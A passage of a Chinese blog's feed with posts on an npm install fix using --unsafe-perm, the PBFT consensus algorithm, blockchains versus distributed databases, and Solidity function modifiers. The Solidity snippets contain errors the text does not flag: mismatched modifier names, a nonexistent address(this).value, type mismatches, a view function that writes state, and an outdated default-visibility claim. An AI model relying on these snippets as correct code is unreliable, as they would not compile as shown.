&#x2F;root&#x2F;.node-gyp），就会崩掉了。<br>为了避免这种情况，要么按照 npm 的规矩来，专门建一个用于运行 npm 的高权限用户；要么加 –unsafe-perm 参数，这样就不会切换到 nobody 上，运行时是哪个用户就是哪个用户，即使是 root。</p></blockquote><p><strong>然后运行：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm i --unsafe-perm<br></code></pre></td></tr></table></figure><p>安装异常就成功解决啦！</p>]]></content>
    
    
    <categories>
      
      <category>包管理器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>npm</tag>
      
      <tag>安装异常</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PBFT实用拜占庭容错算法原理</title>
    <link href="/2022/09/17/PBFT%E5%AE%9E%E7%94%A8%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%AE%B9%E9%94%99%E7%AE%97%E6%B3%95/"/>
    <url>/2022/09/17/PBFT%E5%AE%9E%E7%94%A8%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%AE%B9%E9%94%99%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本篇文章开启区块链共识算法的教学——我以 PBFT （Practical-Byzantine-fault-tolerant）实用拜占庭容错共识算法打头阵。</p><p>为什么先是PBFT呢？</p><p>一个原因是觉得这个算法的名字很酷，实际上它也有着有趣的历史背景。另一个原因呢，就是最近在接触联盟链，而这个算法呢，正是专属于联盟链的共识算法。</p></blockquote><h2 id="共识算法概览"><a href="#共识算法概览" class="headerlink" title="共识算法概览"></a>共识算法概览</h2><p><img src="/2022/09/17/PBFT%E5%AE%9E%E7%94%A8%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%AE%B9%E9%94%99%E7%AE%97%E6%B3%95/a.png" alt="1"></p><p>联盟链有两个共识算法：一个是本章将去讲的PBFT，另一个就是DBFT(Delegated Byzantine fault tolerance)委托拜占庭容错共识算法。</p><blockquote><p>在区块链中有一个著名的问题，就是拜占庭将军问题，对于拜占庭将军问题，这里不再做普及，因为网上相关的文章已经很多了。不了解的同学移步至此<a href="https://zhuanlan.zhihu.com/p/107439021">拜占庭将军问题</a>。</p></blockquote><h2 id="PBFT为何而来"><a href="#PBFT为何而来" class="headerlink" title="PBFT为何而来"></a>PBFT为何而来</h2><p>PBFT 刚开始是在MIT的Miguel 和 Barbara Liskov在1999年的学术论文中提出的，他们的本意是为设计一个低延迟存储系统设计系统，将算法复杂度由指数级降低到多项式级，使得拜占庭容错算法在实际系统应用中变得可行，主要是为了应用于不需要大交易量但需要处理许多事件的数字资产平台，每个节点都可以发布公钥，这是被允许的。</p><p>节点将签名所有通过节点的消息，以验证其准确性。当得到一定数量的签名想用，此交易就被认定为有效。</p><p>解决了BFT(原始拜占庭容错算法)效率不高的问题，将算法复杂度由指数级降低到多项式级，使得拜占庭容错算法在实际系统应用中变得可行。</p><h2 id="PBFT对付恶意节点"><a href="#PBFT对付恶意节点" class="headerlink" title="PBFT对付恶意节点"></a>PBFT对付恶意节点</h2><h3 id="几个数字"><a href="#几个数字" class="headerlink" title="几个数字"></a>几个数字</h3><blockquote><p>了解即可，后面会提到</p><p>f 是恶意节点数，N是总结点数</p></blockquote><ol><li>3f ： 临界点数</li><li>3f + 1  ：总结点最小数</li><li>(N-1)&#x2F;3 ：最大容错节点数</li></ol><p>当节点数&gt;3时，拜占庭将军问题的有解情况将会比较复杂；</p><p>For example：</p><h3 id="N-x3D-3f"><a href="#N-x3D-3f" class="headerlink" title="N &#x3D; 3f"></a>N &#x3D; 3f</h3><p>当<strong>恶意节点数</strong>f &#x3D; 1时，<strong>总结点数</strong>N &#x3D; 3f &#x3D; 3时，问题将会无解，如下图所示</p><p><img src="/2022/09/17/PBFT%E5%AE%9E%E7%94%A8%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%AE%B9%E9%94%99%E7%AE%97%E6%B3%95/PBFT%E5%AE%9E%E7%94%A8%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%AE%B9%E9%94%99%E7%AE%97%E6%B3%95%5Cb.jpg"></p><p>显而易见，在f &#x3D; N&#x2F;3的时候，整个节点系统都将无法做出正确的决定；因为恶意节点恶意传递结果，导致无论恶意节点时发令者还是接令者，都会坏了整个结果的输出；</p><h3 id="N-gt-3f"><a href="#N-gt-3f" class="headerlink" title="N &gt; 3f"></a>N &gt; 3f</h3><p>当<strong>恶意节点数</strong>f &#x3D; 1时，<strong>总结点数</strong>N &gt; 3f &#x3D; 4时，问题将会得到解决，如下图所示：</p><p><img src="/2022/09/17/PBFT%E5%AE%9E%E7%94%A8%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%AE%B9%E9%94%99%E7%AE%97%E6%B3%95/PBFT%E5%AE%9E%E7%94%A8%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%AE%B9%E9%94%99%E7%AE%97%E6%B3%95%5Cc.jpg"></p><p><img src="/2022/09/17/PBFT%E5%AE%9E%E7%94%A8%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%AE%B9%E9%94%99%E7%AE%97%E6%B3%95/PBFT%E5%AE%9E%E7%94%A8%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%AE%B9%E9%94%99%E7%AE%97%E6%B3%95%5Cd.jpg"></p><p>无论恶意节点如何恶意地传递信息，由于还存在着其他三个公平节点，因此最后总是能够<strong>少数服从多数</strong>，得到最终的结果。</p><h3 id="为什么最大容错节点数是（N-1）-x2F-3-？"><a href="#为什么最大容错节点数是（N-1）-x2F-3-？" class="headerlink" title="为什么最大容错节点数是（N-1）&#x2F;3  ？"></a>为什么最大容错节点数是（N-1）&#x2F;3  ？</h3><p>假定节点总数是N，作恶节点数为f，那么剩下的正确节点数为<code>N - f</code>。</p><p>意味着只要收到N - f个消息且<code>N - f &gt; f</code>就能做出决定，但是这<code>N - f</code>个消息里可能有f个是由作恶节点冒充的（或因网络延迟导致f个恶意节点的消息先被收到），那么正确的消息就是<code>N - f - f</code>个。</p><p>为了多数一致，正确消息必须占多数，也就是<code>N - f - f &gt; f </code>，所以N最少是<code>3f + 1</code>个。 </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li>节能。</li><li>吞吐量高。</li><li>分叉几率很低。</li><li>节点数适当时交易延时极低。</li><li>PBFT中的主节点并不具备很大权限，与普通节点地位相对平等，如果主节点出现问题，普通节点可以拒绝其请求并可以很容易地将其替换。</li></ul><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul><li>节点需要选举或许可，不像PoW可以随意加入，去中心化程度相对较弱。</li><li>不能很好的存贮记录交易信息，黑客能够截取一些失效的副本，这可能会让信息外漏。</li><li>系统节点是固定的，无法应对公有链的开放环境。因此只适用于节点数量少且网络环境更可信的联盟链或私有链。</li><li>安全边界较Pow等算法相对较低。Pow对网络内恶意算力容忍度为不超过1&#x2F;2，PBFT对恶意节点数的容忍度则为1&#x2F;3。</li><li>受节点数量限制，可扩展性差，由于每个副本节点都需要和其它节点进行P2P的共识同步，因此随着节点的增多，性能会下降的很快。</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>共识算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PBFT</tag>
      
      <tag>联盟链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>区块链VS分布式数据库：革新与代价</title>
    <link href="/2022/09/11/%E5%8C%BA%E5%9D%97%E9%93%BEVS%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9A%E9%9D%A9%E6%96%B0%E4%B8%8E%E4%BB%A3%E4%BB%B7/"/>
    <url>/2022/09/11/%E5%8C%BA%E5%9D%97%E9%93%BEVS%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9A%E9%9D%A9%E6%96%B0%E4%B8%8E%E4%BB%A3%E4%BB%B7/</url>
    
    <content type="html"><![CDATA[<h1 id="区块链VS分布式数据库：革新与代价"><a href="#区块链VS分布式数据库：革新与代价" class="headerlink" title="区块链VS分布式数据库：革新与代价"></a>区块链VS分布式数据库：革新与代价</h1><p><strong>前情提示：本文较为硬核，若有兴趣需耐心阅读，不感兴趣请跳至简言之，喜欢思辨的同学可以跳至悖论，希望对有心之人产生启发~</strong></p><blockquote><p>自2009年比特币正式诞生，到2013年以太坊横空出世，再到今22年的9月15号以太坊即将迎来合并的巨大变革。我们对于区块链的技术的认知越来越趋向“越来越像分布式数据库”发展。</p><p>而事实也确实如此，区块链从诞生之初只服务于加密货币，到现在随着智能合约、共识技术的发展，区块链也慢慢被用来服务于通用的数据管理系统。</p><p>只不过，在区块链的身上仍散发着这一代人激进与寻求突破的气息。相对于分布式数据库，区块链有很大的革新，但代价也不会小。</p><p>如何权衡这样的 “交换”，我将从它们之间的四个差异点（复制、并发、存储、分片）出发。</p></blockquote><h2 id="🌻区块链"><a href="#🌻区块链" class="headerlink" title="🌻区块链"></a>🌻区块链</h2><p>区块链最初只是用来服务加密货币，例如比特币和由此衍生的其它加密货币。</p><p>在 2014 年，以太坊的出现给区块链带来了智能合约。智能合约的出现，使得区块链上的应用不仅局限于加密货币，还可以支持图灵完全（Turing-complete）的应用计算，这使得区块链逐渐朝着一种通用的去中心化计算平台发展。</p><p>从<strong>数据结构</strong>的角度来看，区块链是一条由哈希指针串联起来的区块链表，每个区块中包含了一系列交易。</p><p>从<strong>系统</strong>的角度来看，区块链是一个由多个互不信任的节点共同维护一个全网一致的账本的分布式系统。</p><p>从<strong>分布式系统</strong>的角度来看，区块链解决了公开网络中的<strong>拜占庭</strong>（存在恶意节点）共识问题。</p><ul><li>拜占庭共识问题</li></ul><p><img src="/2022/09/11/%E5%8C%BA%E5%9D%97%E9%93%BEVS%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9A%E9%9D%A9%E6%96%B0%E4%B8%8E%E4%BB%A3%E4%BB%B7/1.webp" alt="1"></p><p>区块链可以分为许可链和非许可链。其中非许可链是完全开放的，每一个人都有资格记账、读取数据，例如比特币、以太坊。而许可链则有一定的准入机制和权限控制，例如国内的蚂蚁链。尽管早期区块链的底层设计与数据库完全不同，但是智能合约应用到了区块链以后，用户能够自由地部署和运行图灵完备的代码，使得区块链与分布式数据库之间产生了可比性。</p><h2 id="🌻分布式数据库"><a href="#🌻分布式数据库" class="headerlink" title="🌻分布式数据库"></a>🌻分布式数据库</h2><p>分布式数据库是一种数据存储在不同物理位置的数据库。多年来，传统的关系型数据库一直是主流。由于大数据处理和硬件发展等等的现实原因，为了实现系统的高可用性和可扩展性，分布式系统开始进化，在这个新的设计趋势下，出现了NoSQL和NewSQL。</p><p>NoSQL 更倾向于提供可用性，而不是一致性。采用 NoSQL 的数据库可以选择多种不同的一致性等级，不同的等级会导致系统表现不同的性能。用户可以根据实际的使用场景在性能和一致性上进行取舍。</p><p>NoSQL 的这种设计虽然更加灵活，但加大了上层应用的复杂性，因此一种介于关系数据库与 NoSQL 之间的设计，NewSQL 应运而生。NewSQL 既保留了关系数据库的数据模型以及对 ACID 语义的支持，同时也维持了一定的可扩展性。</p><p><img src="/2022/09/11/%E5%8C%BA%E5%9D%97%E9%93%BEVS%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9A%E9%9D%A9%E6%96%B0%E4%B8%8E%E4%BB%A3%E4%BB%B7/2.webp" alt="2"></p><h2 id="🌈代价与革新"><a href="#🌈代价与革新" class="headerlink" title="🌈代价与革新"></a>🌈代价与革新</h2><blockquote><p>区块链小弟在发展中不经意继承了分布式数据库大哥的衣钵，但在“穿衣风格”上，小弟穿的更具有时代更迭的气息，也就是更具有包容性与激进性；如何理解它的包容与激进，如何权衡代价与革新：我将从四个点出发</p></blockquote><h3 id="1-Replication（复制）"><a href="#1-Replication（复制）" class="headerlink" title="1. Replication（复制）"></a>1. Replication（复制）</h3><p>首先我要提及复制，对数据进行复制是防止节点失效影响的最直接、最有效的方法。然而复制也将带来一个非常严重的问题——<strong>数据一致性问题</strong>。</p><p>解决<strong>数据一致性问题</strong>的一个非常经典方式就是<strong>状态复制机</strong>（state machine replication），即所有节点起始于相同的状态，维护相同的交易日志，于是只要每个节点按照相同的顺序执行每一笔交易，则每个节点的状态也应该是相同的。</p><p>实现<strong>状态复制机</strong>的一个关键技术就是<strong>共识算法</strong>，而区块链基于分布式数据库的区别之一便是共识算法。</p><ul><li>在传统的分布式数据库当中，节点属于值得信任的内部系统，因而只需要容忍节点宕机，数据库通常使用<strong>CFT</strong>协议（<strong>Protocols that tolerate crash failures</strong>），例如Paxos、Raft；</li><li>而在区块链中，各个节点需要在互不信任的情况下达成共识，因此需要容忍节点的恶意行为，因此区块链常常会使用代价更大的<strong>BFT</strong> 协议（<strong>Protocols that tolerate Byzantine failures</strong>），例如<strong>PBFT</strong>、PoW等。</li><li>如下表所示，在故障点数F已知的情况之下，CFT与BFT协议在不同的网络模型当中需要达到的网络规模区别是很大的。</li></ul><table><thead><tr><th align="center"></th><th align="center">同步网络</th><th align="center">异步网络</th></tr></thead><tbody><tr><td align="center">CFT</td><td align="center">F+1</td><td align="center">2F+1</td></tr><tr><td align="center">BFT</td><td align="center">2F+1</td><td align="center">3F+1</td></tr><tr><td align="center"></td><td align="center">由此也可知区块链复制的代价比分布式数据库大很多</td><td align="center"></td></tr></tbody></table><p>除了共识算法的不同，区块链和分布式数据库还在<strong>复制的级别</strong>上存在差异，也就是我们常说的数据粒度。</p><ul><li><p>分布式数据库由于可以依赖一个中心化的“调度员”（这是个可以信赖的系统内部中心），因此在做复制之前可以首先由“调度员”将交易分成更细粒度的指令再分发给不同的节点做复制。</p></li><li><p>而在区块链中，交易本身并不需要复制到所有节点，负责执行指令的节点也不知道原交易的执行逻辑。然而区块链没有可信赖的中心，于是一般在<strong>交易级别</strong>做复制，之后再由每个节点执行交易中所包含的所有指令。</p></li></ul><h4 id="简言之"><a href="#简言之" class="headerlink" title="简言之"></a>简言之</h4><p>在解决数据一致性上，共识算法是解决问题的根本，但区块链往往需要为了它所谓的<strong>去中心化</strong>付出更多代价。</p><h3 id="2-Concurrency（并发）"><a href="#2-Concurrency（并发）" class="headerlink" title="2. Concurrency（并发）"></a>2. Concurrency（并发）</h3><p>并发指的是让交易或事务在同一时间执行。</p><ul><li><p>在传统分布式数据库中，并发控制技术一直是研究热点，好的并发优化能够使得数据库系统的性能大大提升。</p></li><li><p>而在现有的大部分区块链中，交易仍然是串行执行的。区块链对并发的支持并不友好，主要原因在于，交易执行在很多区块链系统中并非性能瓶颈。例如，在比特币中，一个区块的执行时间在毫秒级，相比于 10 分钟的区块产生时间，执行部分几乎可以忽略不计。其次，由于交易常常会共用合约的状态数据，因而串行执行往往是最简单和保险的方式。</p></li></ul><h4 id="简言之-1"><a href="#简言之-1" class="headerlink" title="简言之"></a>简言之</h4><p>在并发层面，分布式数据库追求极致的并发以提高性能；而区块链并不支持并发，为了保证节点数据的安全与公正。</p><h3 id="3-Storage（存储）"><a href="#3-Storage（存储）" class="headerlink" title="3. Storage（存储）"></a>3. Storage（存储）</h3><ul><li><p>区块链是一个 <strong>append-only</strong> 的账本，包含了从创世区块开始到最新的区块中包含的全部交易历史，这也就导致了很多主流的区块链的存储量动辄就要上百 GB。为了支持真实性验证，区块链一般采用类似 <strong>Merkle Tree</strong> 的数据结构存储区块中的交易。</p></li><li><p>而在大部分的数据库中，除非是有特殊的需求，用户一般只能访问最新的数据。历史数据会以 log 的形式保存一段时间供节点失效恢复的时候使用，但一般会被定期清理掉以节省存储空间。另一方面，由于分布式数据库更在乎性能，因此在建立索引的时候会根据硬件的性质进行特殊的优化。例如，数据在硬盘中一般会以 <strong>B+ 树</strong>的数据结构存储，而在内存中则用对多核并行和缓存更加友好的 FAST 或 PSL 等结构。</p></li></ul><h4 id="简言之-2"><a href="#简言之-2" class="headerlink" title="简言之"></a>简言之</h4><p>​区块链上的数据是不可篡改的，因此它的存储量将会远超分布式数据库，在主流公链上存储量更是大得可怕。因此在数据结构的选择上，区块链将会选择便于快速数据验证的数据结构如 <strong>Merkle Tree</strong> ；在分布式数据库上将会选择有利于提升性能的数据结构如<strong>B+ 树</strong>。</p><p>[^Merkle Tree]: 默克尔树，区块链用于数据验证的数据结构。可参考这篇文章<a href="https://nangbowan.github.io/2022/09/02/Merkle%E6%A0%91%E2%80%94%E2%80%94%E9%AA%8C%E8%AF%81NFT%E7%99%BD%E5%90%8D%E5%8D%95/">Merkle树——验证NFT白名单 </a><br>[^append-only]: append-only 是计算机数据存储的一种属性，将新数据附加到存储中，但现有数据是不可变的。</p><h3 id="4-Sharding（分片）"><a href="#4-Sharding（分片）" class="headerlink" title="4. Sharding（分片）"></a>4. Sharding（分片）</h3><p>分片技术是提高数据库可拓展性的关键性技术，它将数据分布到不同的shard当中，由shard中的节点进行处理，从而达到扩展系统或提升处理性能的目的。</p><p>然而在区块链中引入shard并不简单，主要有两个挑战</p><p><strong>第一，如何进行分片？</strong></p><p>我们都知道区块链需要容忍拜占庭错误，而这依赖于一个大前提，即网络中一定比例的节点是诚实的。</p><blockquote><p>例如，在 PoW 中要求总算力的 50% 是诚实的，而 PBFT (实用拜占庭容错算法)则要求超过 2&#x2F;3 的节点数是诚实的。</p></blockquote><p>在将区块链的网络进行sharding时就需要保证每个shard的安全假设都是成立的，一旦有一个 shard 的安全前提不成立，那么整个系统的安全性都无法保证。</p><p>然而由于在sharding的时候一般都是<strong>随机</strong>将节点分配到不同的shard，这就要求总结点数规模要足够大，<strong>而且shard的个数不能过多</strong>，这样才能<strong>保证每个 shard 中有足够数量的节点保证安全前提能够成立</strong>。</p><p><strong>第二，如何保证shard之间的原子性？</strong></p><p>即一笔交易要么在所有shard都 commit，要么在所有shard都 abort。</p><p>shard的原子性要求跨shard的事务在它涉及到的所有shard中要么都提交，要么都中止，表现出行为上的一致性。</p><ul><li>在分布式数据库中，原子性一般由<strong>2PC</strong>保证，这需要依赖某个可信的“调度者”。</li><li>而区块链中缺少这样的协调者，因此会引入<strong>BFT</strong>协议来协调跨分片交易。</li></ul><p>[^2PC]: 2 Phase Commit，两阶段提交协议</p><h4 id="简言之-3"><a href="#简言之-3" class="headerlink" title="简言之"></a>简言之</h4><p>在分片层面，区块链由于需要保证各片区的安全性，它分片的门槛会相对更高，并且仍会有几率组成不安全的整体。并且区块链技术由于缺少可信任的内部中心化调度者，在实现原子性层面上需要使用代价更大的BFT协议。</p><h2 id="💎悖论——哲学思考"><a href="#💎悖论——哲学思考" class="headerlink" title="💎悖论——哲学思考"></a>💎悖论——哲学思考</h2><p>让我觉得很有意思的一件事就是：区块链致力于实现去中心化，因此就直接舍去了在系统内部的那个可以值得信任的“中心化调度者”。</p><p>然而，这样的舍弃必然付出代价，在与分布式数据库做差异对比的时候，区块链在每一个层面都在为自己埋下的伏笔“填坑”，也就是为了去中心化而不得不走“中心化”的老路。</p><p>这一点让我不禁一笑，本身在人类社会中，将<strong>权利完全下放</strong>是一件需要人类文明上升几个维度才可能实现的事，毕竟人心才是最可怕的。</p><p>于是我们在区块链中模拟了这样的试验，将权力下放给每一个节点，每个人都是真真正正的平等（仅在公链中）。</p><p>让我们来看看试验结果——区块链如今快成了“诈骗”的代名词。有的人骗术高明，因而一夜暴富；也有的人提供平台，可持续性地竭泽而渔，开赌场了属于是；更有的人涉世未深，却想着靠区块链技术暴富，只落得倾家荡产的下场；</p><p>虽然完全公平，但这里就像<strong>罪恶都市</strong>，一切贪婪，犯罪，欺骗，在这里统统被无条件地放大。</p><p>回到上文提及的系统内部“中心化调度者”，实际上只要这样的“中心化调度者”的操纵者拥有一颗“纯洁的心灵”，纯洁到公平地对待一切处理，那么区块链技术将没必要存在，也不可能被发明，但现实生活中我想不会存在这样的人吧。</p><p>因此，我最想说的是，我们设法用技术的革新来填补人心的无底洞，然而得到的却是——<strong>从一个人的贪婪走向一群人的贪婪</strong>。</p><h2 id="🌙走向融合"><a href="#🌙走向融合" class="headerlink" title="🌙走向融合"></a>🌙走向融合</h2><p>随着区块链技术逐渐走向落地，无论是工业界还是学术界都在致力于提高区块链的性能，其中借鉴分布式数据库中成熟的技术则是<strong>最简单和保险</strong>的做法。例如，BlockchainDB  和 FalconDB 就在区块链系统的基础上引入数据库的 feature，使得互不信任的多方可以共同参与维护一个可验证的数据库。</p><p>另一方面，区块链所具备的一些安全特性也受到了一些数据库设计者的青睐，使得一些新型的更加追求安全性的数据库也具备了区块链的基因。例如，Blockchain Relational Database 就是在 PostgreSQL 的基础上引入区块链中所具备的去中心化和可追溯的特性所设计的新型关系数据库。</p><h2 id="📕参考文献"><a href="#📕参考文献" class="headerlink" title="📕参考文献"></a>📕参考文献</h2><p>[1] Blockchains vs. Distributed Databases: Dichotomy and Fusion: <a href="https://link.zhihu.com/?target=https://arxiv.org/abs/1910.01310">Blockchains vs. Distributed Databases: Dichotomy and Fusion</a></p><p>[2] Casper: <a href="https://link.zhihu.com/?target=https://github.com/ethereum/casper">ethereum&#x2F;casper</a></p><p>[3] BlockchainDB - A Shared Database on Blockchains: <a href="https://link.zhihu.com/?target=http://www.vldb.org/pvldb/vol12/p1597-el-hindi.pdf">http://www.vldb.org/pvldb/vol12/p1597-el-hindi.pdf</a></p><p>[4] FalconDB: Blockchain-based Collaborative Database: <a href="https://link.zhihu.com/?target=http://www.cs.utah.edu/~lifeifei/papers/falcondb.pdf">http://www.cs.utah.edu/~lifeifei&#x2F;papers&#x2F;falcondb.pdf</a></p><p>[5] Blockchain Meets Database: Design and Implementation of a Blockchain Relational Database: <a href="https://link.zhihu.com/?target=http://www.vldb.org/pvldb/vol12/p1539-nathan.pdf">http://www.vldb.org/pvldb/vol12/p1</a></p>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>分布式数据库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>革新</tag>
      
      <tag>思考未来</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nginx&amp;Caddy操作小结</title>
    <link href="/2022/09/09/Nginx-Caddy%E6%93%8D%E4%BD%9C%E5%B0%8F%E7%BB%93/"/>
    <url>/2022/09/09/Nginx-Caddy%E6%93%8D%E4%BD%9C%E5%B0%8F%E7%BB%93/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Solidity函数修饰符大全</title>
    <link href="/2022/09/09/Solidity%E5%87%BD%E6%95%B0%E4%BF%AE%E9%A5%B0%E7%AC%A6%E5%A4%A7%E5%85%A8/"/>
    <url>/2022/09/09/Solidity%E5%87%BD%E6%95%B0%E4%BF%AE%E9%A5%B0%E7%AC%A6%E5%A4%A7%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="可见性修饰符"><a href="#可见性修饰符" class="headerlink" title="可见性修饰符"></a>可见性修饰符</h2><blockquote><p>决定函数何时和被谁调用。</p></blockquote><p>public ：函数对外可见，可以在任何地方调用，不管是内部还是外部；</p><p>private ：函数对外不可见，只能被合约内部调用；</p><p>external：函数对外可见，只能从合约外部调用；</p><p>internal ：函数对外不可见，只能被合约内部调用或者被继承的合约调用；</p><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><p><mark>不写默认就是public</mark></p><h2 id="状态修饰符"><a href="#状态修饰符" class="headerlink" title="状态修饰符"></a>状态修饰符</h2><blockquote><p>用来表示函数如何与区块链交互。</p></blockquote><p>view ：运行这个函数不会更改和保存任何数据；</p><p>pure ：运行这个函数不仅不会往区块链写数据，甚至不从区块链读取数据；</p><p>constant: 和view的功能是一样的，在5.0版本后被废弃；</p><h3 id="example"><a href="#example" class="headerlink" title="example"></a><strong>example</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract Test&#123;<br>    <br>    uint256 public a1 = 100;<br>    uint256 a2 = 256;<br>    <br>    <br>    //为了明确语义，一般要加上view（constant两者完全相同）<br>    //表示不会修改函数内的状态变量<br>    function add() view returns(int)&#123;<br>        return a1+a2;<br>    &#125;<br>    <br>    function setValue(int num)&#123;<br>        a1 = num;<br>    &#125;<br>    <br>     function setValue1(int num) view&#123;<br>        a1 = num;<br>    &#125;<br>    <br>    //因为pure不读也不写入链，因此带pure的函数一般只做纯逻辑的处理<br>     function isEqual(int a, int b) public pure returns(bool) &#123;<br>       return a == b;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="注意点-1"><a href="#注意点-1" class="headerlink" title="注意点"></a>注意点</h3><p>这两种在被&#x3D;&#x3D;合约外部调用&#x3D;&#x3D;的时候都不花费任何gas</p><p>但是它们在被&#x3D;&#x3D;内部其他函数调用&#x3D;&#x3D;的时候将会耗费gas。</p><h2 id="自定义修饰符（modifiers）"><a href="#自定义修饰符（modifiers）" class="headerlink" title="自定义修饰符（modifiers）"></a>自定义修饰符（modifiers）</h2><blockquote><p>如onlyowner、aboveLevel等自定义的modifiers，对于这些修饰符我们可以自定义其对函数的约束逻辑。</p><p>所有自定义的修饰符都需要在逻辑最后留下占位符 “_;”</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">  //第一个自定义修饰器，要求只能够合约的拥有者才能够操作<br>  modifier onlyOwner() &#123;<br><br>  require(msg.sender == owner);<br>  _;<br><br>&#125;<br><br>  //第二个自定义函数修饰器，要求消息发送者携带的value大于合约的vulue<br>  modifier antherModifier() &#123;<br><br>  require(msg.value &gt; address(this).value,&quot;your balance is not enough&quot;);<br>  _;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>这些修饰符可以同时作用于一个函数定义上，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function test() external view onlyOwner anotherModifier &#123;  &#125;<br></code></pre></td></tr></table></figure><h2 id="payable修饰符"><a href="#payable修饰符" class="headerlink" title="payable修饰符"></a>payable修饰符</h2><blockquote><p>可以接收以太的特殊函数修饰符</p></blockquote><h3 id="example-one"><a href="#example-one" class="headerlink" title="example_one"></a><strong>example_one</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.24;<br><br><br>contract test1 &#123;<br>    uint public num;<br><br>    //如果构造函数中未指定payable关键字，那么创建合约时不允许转账<br>    //如果指定了payable，则可以转账<br>    constructor() public  &#123;<br>        //构造函数<br><br>    &#125;<br><br>    //任何函数，只要指定了payable关键字，这个合约就可以接受转账,调用时，也可以转0<br>    function giveMoney() public payable &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="example-two"><a href="#example-two" class="headerlink" title="example_two"></a><strong>example_two</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity"><br><br>contract OnlineStore &#123;<br><br>  function buySomething() external payable &#123;<br>    // 检查以确定0.001以太发送出去来运行函数:<br>    require(msg.value == 0.001 ether);<br>    // 如果为真，一些用来向函数调用者发送数字内容的逻辑<br>    transferThing(msg.sender);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="注意点-2"><a href="#注意点-2" class="headerlink" title="注意点"></a>注意点</h3><p> 如果一个函数没标记为payable， 而你尝试利用上面的方法发送以太，函数将拒绝你的事务。</p>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>solidity</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实战——光速了解DAPP</title>
